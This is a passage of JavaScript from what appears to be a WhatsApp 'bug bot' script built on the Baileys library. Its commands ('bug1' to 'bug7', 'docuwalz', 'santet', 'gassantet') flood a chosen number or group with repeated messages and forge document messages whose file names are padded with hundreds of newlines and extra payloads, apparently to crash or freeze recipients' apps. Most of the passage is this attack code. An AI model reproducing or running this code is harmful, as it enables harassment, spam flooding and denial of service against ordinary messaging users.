Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await anggazyy404.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas2' : {

if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await anggazyy404.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
anggazyy404.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(10000)
}
break
//=================================================//
case 'gaswalz': {

if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`${m.pushName} Hello Saya Bot Anggazyy 1981 ${text ? ': ' + text : ''}`)
}
break
//========================================
case 'docuwalz1': {
if (!isCreator) return

var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 Anggazyy 1981 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
anggazyy404.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'docuwalz3': {
if (!isCreator) return

var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 Anggazyy 1981 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
anggazyy404.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
        case 'gassantet': {          
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(`${text}@s.whatsapp.net`, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
            case 'bug1': {
if (!isCreator) return

var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//=================================================//
case 'bug2': {
if (!isCreator) return

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./images/anggazyy.jpg') }, { upload: anggazyy404.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© Anggazyy 1981${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
//=================================================//
case 'bug3': {
if (!isCreator) return

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./images/anggazyy.jpg') }, { upload: anggazyy404.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© Anggazyy 1981${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bug4': {
if (!isCreator) return


var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© Anggazyy 1981`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© Anggazyy 1981${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug5': {
if (!isCreator) return

var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
//=================================================//
case 'bug6': {
if (!isCreator) return

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./images/anggazyy.jpg') }, { upload: anggazyy404.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/50767666664",
"matchedText": "https://wa.me/c/62882021734861",
"description": "Developer Anggazyy 1981\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© Anggazyy 1981${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug7': {
if (!isCreator) return

var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© Anggazyy 1981${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:anggazyy404\nitem1.TEL;waid=50767666664:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer Anggazyy 1981WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Anggazyy\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case 'lokas': {
if (!isCreator) return

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./images/anggazyy.jpg') }, { upload: anggazyy404.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© Anggazyy 1981${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
anggazyy404.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
         case 'santet':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ANGGAZYY 404ˣ_ˣ SANTET`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await anggazyy404.sendMessage(m.chat, {text:"ANGGAZYY 404ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
